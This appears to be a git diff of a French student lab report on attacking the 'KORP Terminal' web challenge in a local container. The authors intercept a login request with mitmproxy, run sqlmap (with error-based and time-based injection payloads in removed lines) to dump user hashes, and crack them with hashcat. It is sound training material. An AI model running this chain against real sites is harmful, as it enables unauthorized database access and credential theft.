@@ -1,123 +1,66 @@
-# Rapport TP Attaque/defense
+# Rapport TP Webapp KORP Terminal
 
 By Clement ALLEGRE--COMMINGES and PETIT Lucien
 
 ## Sommaire
 
+- [Introduction](#introduction)
+- [1. Presentation de l'attaque](#1-presentation-de-lattaque)
+- [2. Démarage des services](#2-démarage-des-services)
+- [3. Déroulement de l'attaque](#3-déroulement-de-lattaque)
+  - [3.1 Obtention des informations sur la communication entre le client et le terminal](#31-obtention-des-informations-sur-la-communication-entre-le-client-et-le-terminal)
+  - [3.2 Recupération de la description des tables](#32-recupération-de-la-description-des-tables)
+  - [3.3 Récuperation des tables](#33-récuperation-des-tables)
+  - [3.4 Récuperation des mots de passe](#34-récuperation-des-mots-de-passe)
+  - [3.5 Obtention du flag](#35-obtention-du-flag)
+- [Conclusion](#conclusion)
+
 ## Introduction
 
-## 1. mise en place serveur proxy mitm
+Ce TP a pour but de mettre en oeuvre une attaque "Man in the midle" via un serveur proxy dans le but d'obtenir des identifiants de connexion. Il s'agit d'une attaque de type élevation de privilège. Nous commencerons par présenter l'attaque avant de présenter sont execution. Comme pour le précèdent TP (TimeKorp), nous avons souhaité pour dans une démarche d'approche en boîte noire dans l'objectif de mieux comprendre les mécancaniques de cette attaque ainsi que les problèmatiques liées.
 
-```bash
-user@motivation:~/Documents $ sudo apt install mitmproxy
+## 1. Presentation de l'attaque
 
-user@motivation:~/Documents $ docker network inspect bridge
-[
-    {
-        "Name": "bridge",
-        "Id": "2fde6a211bd9b871c645ad466f740567082be3eef0eebc39aad5e6bf581b1171",
-        "Created": "2025-12-08T07:40:12.285337437Z",
-        "Scope": "local",
-        "Driver": "bridge",
-        "EnableIPv4": true,
-        "EnableIPv6": false,
-        "IPAM": {
-            "Driver": "default",
-            "Options": null,
-            "Config": [
-                {
-                    "Subnet": "172.17.0.0/16",
-                    "IPRange": "",
-                    "Gateway": "172.17.0.1"
-                }
-            ]
-        },
-        "Internal": false,
-        "Attachable": false,
-        "Ingress": false,
-        "ConfigFrom": {
-            "Network": ""
-        },
-        "ConfigOnly": false,
-        "Options": {
-            "com.docker.network.bridge.default_bridge": "true",
-            "com.docker.network.bridge.enable_icc": "true",
-            "com.docker.network.bridge.enable_ip_masquerade": "true",
-            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
-            "com.docker.network.bridge.name": "docker0",
-            "com.docker.network.driver.mtu": "1500"
-        },
-        "Labels": {},
-        "Containers": {
-            "3104e4742370b55669fe5d1205edcfab2519f9598376a1aa54450e078710efb5": {
-                "Name": "web_time",
-                "EndpointID": "fc508deaa6f4df1d2181e96d5f15ac9372555e1712900a1c9e141767bde342bd",
-                "MacAddress": "d6:43:7a:03:7c:90",
-                "IPv4Address": "172.17.0.3/16",
-                "IPv6Address": ""
-            },
-            "f73dbc04cab519ef83425de189f71651ff5bfc600c4f525d7a91ce9c5be322ca": {
-                "Name": "web_korp_terminal",
-                "EndpointID": "5a146cd336180af34f4b5fa526b422ec2078bc92fa1181dd609dc255d8fe1580",
-                "MacAddress": "aa:05:44:62:b9:ed",
-                "IPv4Address": "172.17.0.2/16",
-                "IPv6Address": ""
-            }
-        },
-        "Status": {
-            "IPAM": {
-                "Subnets": {
-                    "172.17.0.0/16": {
-                        "IPsInUse": 5,
-                        "DynamicIPsAvailable": 65531
-                    }
-                }
-            }
-        }
-    }
-]
+Notre cible est un Terminal Web sur lequel il faut s'indentifier depuis une interface client. Comme présenté ci-dessous:
+![Alt text](./image/schema_infra.png)
+Nous inseront un serveur proxy entre les deux pour nous permettre de capter les communications.
+![Alt text](./image/schema_infra_mitm.png)
+Une fois les communications obtenues, les données échangées serviront de base à une injection SQL à l'aide de l'outil sqlmap. Cette injection SQL nous permettra d'obtenir le contenur de la base de donné de ce site web et notament les noms des utilisateurs ainsi que les hashs des mot de passe associer.
 
+Nous retrouverons ensuite les mot de passe en clair à l'aide de hashcat, un outil d'attaque par dictionnaire.
 
+## 2. Démarage des services
 
-user@motivation:~/.mitmproxy $ docker ps
-CONTAINER ID   IMAGE                 COMMAND                  CREATED             STATUS             PORTS                                                   NAMES
-245b900a0e96   mitmproxy/mitmproxy   "docker-entrypoint.s…"   5 minutes ago       Up 5 minutes       0.0.0.0:8080->8080/tcp, [::]:8080->8080/tcp, 8081/tcp   crazy_wing
-f73dbc04cab5   web_korp_terminal     "/entrypoint.sh"         About an hour ago   Up About an hour   0.0.0.0:1337->1337/tcp, [::]:1337->1337/tcp             web_korp_terminal
-```
+Nous avons commencé par installer le serveur proxy sur notre Raspberry Pi ainsi que le serveur et le client cible.
 
-```mermaid
-graph LR
-A[WebApp client]<-->  |port: 1337       port: 8080| B[Man in the Midel]
-B[MitmProxy] <--> |port: 8080       port:1337 | C[WebApp Terminal]
-```
+Voici les commandes utilisées pour lancer chaque services:
 
-Lancement du client:
+- Pour lancer le service Terminal Korp:
 
-```bash
-user@motivation:~/Documents/sqlmap-dev $ http_proxy=http://127.0.0.1:8080 lynx http://172.17.0.3:1337
-```
+    ```text
+    user@motivation:~/Documents/polytech/web/[Very Easy] KORP Terminal $ sh build_docker.sh
+    ```
+
+- Pour lancer le mitm :
+
+    ```text
+    user@motivation:~ $ docker run --rm -it -v ~/.mitmproxy:/home/mitmproxy/.mitmproxy -p 8080:8080 mitmproxy/mitmproxy mitmdump --flow-detail 3 -w4 -w /home/mitmproxy/.mitmproxy/test.txt
+    ```
+
+- Lancement du client:
+
+    ```text
+    user@motivation:~/Documents/sqlmap-dev $ http_proxy=http://127.0.0.1:8080 lynx http://172.17.0.3:1337
+    ```
 
 ![Alt text](./image/login.png)
 
-Pour lancer le mitm :
+## 3. Déroulement de l'attaque
 
-```bash
-user@motivation:~ $ docker run --rm -it -v ~/.mitmproxy:/home/mitmproxy/.mitmproxy -p 8080:8080 mitmproxy/mitmproxy mitmdump --flow-detail 3 -w4 -w /home/mitmproxy/.mitmproxy/test.txt
-```
-
-Pour lancer le service Terminal Korp:
-
-```bash
-
-```
-
-## 2. dump des communication entre client est serveur
+### 3.1 Obtention des informations sur la communication entre le client et le terminal
 
 Ensuite faire une tentative de connexion avec un user name et mot de passe aléatoire pour communiquer avec le serveur terminal Korp.
-
-Cela permettra au mitmproxy de nous retourner des information que l'ont exploitera ensuite.
-
-```bash
+```text
 
 user@motivation:~/.mitmproxy $ cat test.txt
 POST http://172.17.0.3:1337/?username=user&password=password HTTP/1.0
@@ -147,9 +90,9 @@ Connection: close
 
 ```
 
-## 3. utilisation du dump avec sqlmap pour recupéré la description des tables
+### 3.2 Recupération de la description des tables
 
-```bash
+```text
 user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt --ignore-code 401 -p username --tables
         ___
        __H__
@@ -220,258 +163,21 @@ back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 [16:39:37] [INFO] retrieved: 'test'
 [16:39:37] [INFO] retrieved: 'korp_terminal'
 [16:39:37] [INFO] fetching tables for databases: 'information_schema, korp_terminal, test'
-[16:39:37] [INFO] retrieved: 'information_schema'
-[16:39:37] [INFO] retrieved: 'ALL_PLUGINS'
-[16:39:37] [INFO] retrieved: 'information_schema'
-[16:39:38] [INFO] retrieved: 'APPLICABLE_ROLES'
-[16:39:38] [INFO] retrieved: 'information_schema'
-[16:39:38] [INFO] retrieved: 'CHARACTER_SETS'
-[16:39:38] [INFO] retrieved: 'information_schema'
-[16:39:38] [INFO] retrieved: 'CHECK_CONSTRAINTS'
-[16:39:38] [INFO] retrieved: 'information_schema'
-[16:39:38] [INFO] retrieved: 'COLLATIONS'
-[16:39:38] [INFO] retrieved: 'information_schema'
-[16:39:39] [INFO] retrieved: 'COLLATION_CHARACTER_SET_APPLICABILITY'
-[16:39:39] [INFO] retrieved: 'information_schema'
-[16:39:39] [INFO] retrieved: 'COLUMNS'
-[16:39:39] [INFO] retrieved: 'information_schema'
-[16:39:39] [INFO] retrieved: 'COLUMN_PRIVILEGES'
-[16:39:39] [INFO] retrieved: 'information_schema'
-[16:39:40] [INFO] retrieved: 'ENABLED_ROLES'
-[16:39:40] [INFO] retrieved: 'information_schema'
-[16:39:40] [INFO] retrieved: 'ENGINES'
-[16:39:40] [INFO] retrieved: 'information_schema'
-[16:39:40] [INFO] retrieved: 'EVENTS'
-[16:39:40] [INFO] retrieved: 'information_schema'
-[16:39:40] [INFO] retrieved: 'FILES'
-[16:39:41] [INFO] retrieved: 'information_schema'
-[16:39:41] [INFO] retrieved: 'GLOBAL_STATUS'
-[16:39:41] [INFO] retrieved: 'information_schema'
-[16:39:41] [INFO] retrieved: 'GLOBAL_VARIABLES'
-[16:39:41] [INFO] retrieved: 'information_schema'
-[16:39:41] [INFO] retrieved: 'KEYWORDS'
-[16:39:41] [INFO] retrieved: 'information_schema'
-[16:39:42] [INFO] retrieved: 'KEY_CACHES'
-[16:39:42] [INFO] retrieved: 'information_schema'
-[16:39:42] [INFO] retrieved: 'KEY_COLUMN_USAGE'
-[16:39:42] [INFO] retrieved: 'information_schema'
-[16:39:42] [INFO] retrieved: 'KEY_PERIOD_USAGE'
-[16:39:42] [INFO] retrieved: 'information_schema'
-[16:39:42] [INFO] retrieved: 'OPTIMIZER_COSTS'
-[16:39:43] [INFO] retrieved: 'information_schema'
-[16:39:43] [INFO] retrieved: 'OPTIMIZER_TRACE'
-[16:39:43] [INFO] retrieved: 'information_schema'
-[16:39:43] [INFO] retrieved: 'PARAMETERS'
-[16:39:43] [INFO] retrieved: 'information_schema'
-[16:39:43] [INFO] retrieved: 'PARTITIONS'
-[16:39:43] [INFO] retrieved: 'information_schema'
-[16:39:44] [INFO] retrieved: 'PERIODS'
-[16:39:44] [INFO] retrieved: 'information_schema'
-[16:39:44] [INFO] retrieved: 'PLUGINS'
-[16:39:44] [INFO] retrieved: 'information_schema'
-[16:39:44] [INFO] retrieved: 'PROCESSLIST'
-[16:39:44] [INFO] retrieved: 'information_schema'
-[16:39:44] [INFO] retrieved: 'PROFILING'
-[16:39:45] [INFO] retrieved: 'information_schema'
-[16:39:45] [INFO] retrieved: 'REFERENTIAL_CONSTRAINTS'
-[16:39:45] [INFO] retrieved: 'information_schema'
-[16:39:45] [INFO] retrieved: 'ROUTINES'
-[16:39:45] [INFO] retrieved: 'information_schema'
-[16:39:45] [INFO] retrieved: 'SCHEMATA'
-[16:39:45] [INFO] retrieved: 'information_schema'
-[16:39:46] [INFO] retrieved: 'SCHEMA_PRIVILEGES'
-[16:39:46] [INFO] retrieved: 'information_schema'
-[16:39:46] [INFO] retrieved: 'SESSION_STATUS'
-[16:39:46] [INFO] retrieved: 'information_schema'
-[16:39:46] [INFO] retrieved: 'SESSION_VARIABLES'
-[16:39:46] [INFO] retrieved: 'information_schema'
-[16:39:46] [INFO] retrieved: 'STATISTICS'
-[16:39:47] [INFO] retrieved: 'information_schema'
-[16:39:47] [INFO] retrieved: 'SQL_FUNCTIONS'
-[16:39:47] [INFO] retrieved: 'information_schema'
-[16:39:47] [INFO] retrieved: 'SYSTEM_VARIABLES'
-[16:39:47] [INFO] retrieved: 'information_schema'
-[16:39:47] [INFO] retrieved: 'TABLES'
-[16:39:47] [INFO] retrieved: 'information_schema'
-[16:39:48] [INFO] retrieved: 'TABLESPACES'
-[16:39:48] [INFO] retrieved: 'information_schema'
-[16:39:48] [INFO] retrieved: 'TABLE_CONSTRAINTS'
-[16:39:48] [INFO] retrieved: 'information_schema'
-[16:39:48] [INFO] retrieved: 'TABLE_PRIVILEGES'
-[16:39:48] [INFO] retrieved: 'information_schema'
-[16:39:48] [INFO] retrieved: 'TRIGGERS'
-[16:39:49] [INFO] retrieved: 'information_schema'
-[16:39:49] [INFO] retrieved: 'USER_PRIVILEGES'
-[16:39:49] [INFO] retrieved: 'information_schema'
-[16:39:49] [INFO] retrieved: 'VIEWS'
-[16:39:49] [INFO] retrieved: 'information_schema'
-[16:39:49] [INFO] retrieved: 'CLIENT_STATISTICS'
-[16:39:49] [INFO] retrieved: 'information_schema'
-[16:39:50] [INFO] retrieved: 'INDEX_STATISTICS'
-[16:39:50] [INFO] retrieved: 'information_schema'
-[16:39:50] [INFO] retrieved: 'INNODB_FT_CONFIG'
-[16:39:50] [INFO] retrieved: 'information_schema'
-[16:39:50] [INFO] retrieved: 'GEOMETRY_COLUMNS'
-[16:39:50] [INFO] retrieved: 'information_schema'
-[16:39:51] [INFO] retrieved: 'INNODB_SYS_TABLESTATS'
-[16:39:51] [INFO] retrieved: 'information_schema'
-[16:39:51] [INFO] retrieved: 'SPATIAL_REF_SYS'
-[16:39:51] [INFO] retrieved: 'information_schema'
-[16:39:51] [INFO] retrieved: 'USER_STATISTICS'
-[16:39:51] [INFO] retrieved: 'information_schema'
-[16:39:51] [INFO] retrieved: 'INNODB_TRX'
-[16:39:52] [INFO] retrieved: 'information_schema'
-[16:39:52] [INFO] retrieved: 'INNODB_CMP_PER_INDEX'
-[16:39:52] [INFO] retrieved: 'information_schema'
-[16:39:52] [INFO] retrieved: 'INNODB_METRICS'
-[16:39:52] [INFO] retrieved: 'information_schema'
-[16:39:52] [INFO] retrieved: 'INNODB_FT_DELETED'
-[16:39:52] [INFO] retrieved: 'information_schema'
-[16:39:53] [INFO] retrieved: 'INNODB_CMP'
-[16:39:53] [INFO] retrieved: 'information_schema'
-[16:39:53] [INFO] retrieved: 'THREAD_POOL_WAITS'
-[16:39:53] [INFO] retrieved: 'information_schema'
-[16:39:53] [INFO] retrieved: 'INNODB_CMP_RESET'
-[16:39:53] [INFO] retrieved: 'information_schema'
-[16:39:53] [INFO] retrieved: 'THREAD_POOL_QUEUES'
-[16:39:54] [INFO] retrieved: 'information_schema'
-[16:39:54] [INFO] retrieved: 'TABLE_STATISTICS'
-[16:39:54] [INFO] retrieved: 'information_schema'
-[16:39:54] [INFO] retrieved: 'INNODB_SYS_FIELDS'
-[16:39:54] [INFO] retrieved: 'information_schema'
-[16:39:54] [INFO] retrieved: 'INNODB_BUFFER_PAGE_LRU'
-[16:39:54] [INFO] retrieved: 'information_schema'
-[16:39:55] [INFO] retrieved: 'INNODB_LOCKS'
-[16:39:55] [INFO] retrieved: 'information_schema'
-[16:39:55] [INFO] retrieved: 'INNODB_FT_INDEX_TABLE'
-[16:39:55] [INFO] retrieved: 'information_schema'
-[16:39:55] [INFO] retrieved: 'INNODB_CMPMEM'
-[16:39:55] [INFO] retrieved: 'information_schema'
-[16:39:55] [INFO] retrieved: 'THREAD_POOL_GROUPS'
-[16:39:56] [INFO] retrieved: 'information_schema'
-[16:39:56] [INFO] retrieved: 'INNODB_CMP_PER_INDEX_RESET'
-[16:39:56] [INFO] retrieved: 'information_schema'
-[16:39:56] [INFO] retrieved: 'INNODB_SYS_FOREIGN_COLS'
-[16:39:56] [INFO] retrieved: 'information_schema'
-[16:39:56] [INFO] retrieved: 'INNODB_FT_INDEX_CACHE'
-[16:39:56] [INFO] retrieved: 'information_schema'
-[16:39:57] [INFO] retrieved: 'INNODB_BUFFER_POOL_STATS'
-[16:39:57] [INFO] retrieved: 'information_schema'
-[16:39:57] [INFO] retrieved: 'INNODB_FT_BEING_DELETED'
-[16:39:57] [INFO] retrieved: 'information_schema'
-[16:39:57] [INFO] retrieved: 'INNODB_SYS_FOREIGN'
-[16:39:57] [INFO] retrieved: 'information_schema'
-[16:39:57] [INFO] retrieved: 'INNODB_CMPMEM_RESET'
-[16:39:58] [INFO] retrieved: 'information_schema'
-[16:39:58] [INFO] retrieved: 'INNODB_FT_DEFAULT_STOPWORD'
-[16:39:58] [INFO] retrieved: 'information_schema'
-[16:39:58] [INFO] retrieved: 'INNODB_SYS_TABLES'
-[16:39:58] [INFO] retrieved: 'information_schema'
-[16:39:58] [INFO] retrieved: 'INNODB_SYS_COLUMNS'
-[16:39:58] [INFO] retrieved: 'information_schema'
-[16:39:59] [INFO] retrieved: 'INNODB_SYS_TABLESPACES'
-[16:39:59] [INFO] retrieved: 'information_schema'
-[16:39:59] [INFO] retrieved: 'INNODB_SYS_INDEXES'
-[16:39:59] [INFO] retrieved: 'information_schema'
-[16:39:59] [INFO] retrieved: 'INNODB_BUFFER_PAGE'
-[16:39:59] [INFO] retrieved: 'information_schema'
-[16:40:00] [INFO] retrieved: 'INNODB_SYS_VIRTUAL'
-[16:40:00] [INFO] retrieved: 'information_schema'
-[16:40:00] [INFO] retrieved: 'user_variables'
-[16:40:00] [INFO] retrieved: 'information_schema'
-[16:40:00] [INFO] retrieved: 'INNODB_TABLESPACES_ENCRYPTION'
-[16:40:00] [INFO] retrieved: 'information_schema'
-[16:40:00] [INFO] retrieved: 'INNODB_LOCK_WAITS'
-[16:40:01] [INFO] retrieved: 'information_schema'
-[16:40:01] [INFO] retrieved: 'THREAD_POOL_STATS'
+-------
+*
+* information non pertinante
+*
+-------
 [16:40:01] [INFO] retrieved: 'korp_terminal'
 [16:40:01] [INFO] retrieved: 'users'
 Database: information_schema
 [82 tables]
-+---------------------------------------+
-| ALL_PLUGINS                           |
-| APPLICABLE_ROLES                      |
-| CHARACTER_SETS                        |
-| CHECK_CONSTRAINTS                     |
-| CLIENT_STATISTICS                     |
-| COLLATIONS                            |
-| COLLATION_CHARACTER_SET_APPLICABILITY |
-| COLUMN_PRIVILEGES                     |
-| ENABLED_ROLES                         |
-| FILES                                 |
-| GEOMETRY_COLUMNS                      |
-| GLOBAL_STATUS                         |
-| GLOBAL_VARIABLES                      |
-| INDEX_STATISTICS                      |
-| INNODB_BUFFER_PAGE                    |
-| INNODB_BUFFER_PAGE_LRU                |
-| INNODB_BUFFER_POOL_STATS              |
-| INNODB_CMP                            |
-| INNODB_CMPMEM                         |
-| INNODB_CMPMEM_RESET                   |
-| INNODB_CMP_PER_INDEX                  |
-| INNODB_CMP_PER_INDEX_RESET            |
-| INNODB_CMP_RESET                      |
-| INNODB_FT_BEING_DELETED               |
-| INNODB_FT_CONFIG                      |
-| INNODB_FT_DEFAULT_STOPWORD            |
-| INNODB_FT_DELETED                     |
-| INNODB_FT_INDEX_CACHE                 |
-| INNODB_FT_INDEX_TABLE                 |
-| INNODB_LOCKS                          |
-| INNODB_LOCK_WAITS                     |
-| INNODB_METRICS                        |
-| INNODB_SYS_COLUMNS                    |
-| INNODB_SYS_FIELDS                     |
-| INNODB_SYS_FOREIGN                    |
-| INNODB_SYS_FOREIGN_COLS               |
-| INNODB_SYS_INDEXES                    |
-| INNODB_SYS_TABLES                     |
-| INNODB_SYS_TABLESPACES                |
-| INNODB_SYS_TABLESTATS                 |
-| INNODB_SYS_VIRTUAL                    |
-| INNODB_TABLESPACES_ENCRYPTION         |
-| INNODB_TRX                            |
-| KEYWORDS                              |
-| KEY_CACHES                            |
-| KEY_COLUMN_USAGE                      |
-| KEY_PERIOD_USAGE                      |
-| OPTIMIZER_TRACE                       |
-| PARAMETERS                            |
-| PERIODS                               |
-| PROFILING                             |
-| REFERENTIAL_CONSTRAINTS               |
-| ROUTINES                              |
-| SCHEMATA                              |
-| SCHEMA_PRIVILEGES                     |
-| SESSION_STATUS                        |
-| SESSION_VARIABLES                     |
-| SPATIAL_REF_SYS                       |
-| SQL_FUNCTIONS                         |
-| STATISTICS                            |
-| SYSTEM_VARIABLES                      |
-| TABLESPACES                           |
-| TABLE_CONSTRAINTS                     |
-| TABLE_PRIVILEGES                      |
-| TABLE_STATISTICS                      |
-| THREAD_POOL_GROUPS                    |
-| THREAD_POOL_QUEUES                    |
-| THREAD_POOL_STATS                     |
-| THREAD_POOL_WAITS                     |
-| USER_PRIVILEGES                       |
-| USER_STATISTICS                       |
-| VIEWS                                 |
-| COLUMNS                               |
-| ENGINES                               |
-| EVENTS                                |
-| OPTIMIZER_COSTS                       |
-| PARTITIONS                            |
-| PLUGINS                               |
-| PROCESSLIST                           |
-| TABLES                                |
-| TRIGGERS                              |
-| user_variables                        |
-+---------------------------------------+
+
+-------
+*
+* information non pertinante
+*
+-------
 
 Database: korp_terminal
 [1 table]
@@ -486,9 +192,9 @@ Database: korp_terminal
 [*] ending @ 16:40:01 /2025-12-09/
 ```
 
-## 4. Utilisation de sqlmap pour récupérer les tables cibles (user, password)
+### 3.3 Récuperation des tables
 
-```bash
+```text
 user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt -D korp_terminal -T users --columns --ignore-code 401
         ___
        __H__
@@ -577,12 +283,9 @@ Table: users
 [16:46:20] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/172.17.0.3'
 
 [*] ending @ 16:46:20 /2025-12-09/
+```
 
-
-
-
-
-
+```text
 user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt -D korp_terminal -T users -C username,password --dump --igno
 re-code 401
         ___
@@ -617,36 +320,12 @@ Connection: close
 "message": "Invalid user or password"
 }
 
-    Type: error-based
-    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: username=user' AND (SELECT 9045 FROM(SELECT COUNT(*),CONCAT(0x716b766b71,(SELECT (ELT(9045=9045,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- MGMf&password=password
+-------
+*
+* information non pertinante
+*
+-------
 
-<< HTTP/1.1 401 UNAUTHORIZED 39b
-Server: Werkzeug/3.1.4 Python/3.12.12
-Date: Tue, 09 Dec 2025 16:19:58 GMT
-Content-Type: application/json
-Content-Length: 39
-Connection: close
-
-{
-"message": "Invalid user or password"
-}
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: username=user' AND (SELECT 4340 FROM (SELECT(SLEEP(5)))THqE)-- FTYa&password=password
-
-<< HTTP/1.1 401 UNAUTHORIZED 39b
-Server: Werkzeug/3.1.4 Python/3.12.12
-Date: Tue, 09 Dec 2025 16:19:58 GMT
-Content-Type: application/json
-Content-Length: 39
-Connection: close
-
-{
-"message": "Invalid user or password"
-}
----
 [16:50:04] [INFO] the back-end DBMS is MySQL
 back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 [16:50:04] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'korp_terminal'
@@ -673,20 +352,18 @@ Table: users
 [16:50:05] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/172.17.0.3'
 
 [*] ending @ 16:50:05 /2025-12-09/
+```
 
-
-
-
-
+```text
 user@motivation:~/Documents $ cat users
 test:$2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTDis.fuD6mx0lq9tLNe
 user:$2y$10$bfni4oATx18uvyU9Aff8yuoXkjubqZyksIrj9zkSOwAYTBmN4Zroi
 admin:$2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6
 ```
 
-## 5. Utilisation de hascat pour retrouver les mot de passe associer aux hashs
+### 3.4 Récuperation des mots de passe
 
-```bash
+```text
 user@DESKTOP-5QE5MM5:~$ sudo gzip -d rockyou.txt.gz
 
 
@@ -807,7 +484,7 @@ Stopped: Tue Dec  9 18:08:00 2025
 
 ```
 
-## 6. Obtention du flag
+### 3.5 Obtention du flag
 
 Tentaive de connexion avec user : `admin` et password : `myprecious` depuis le client
 
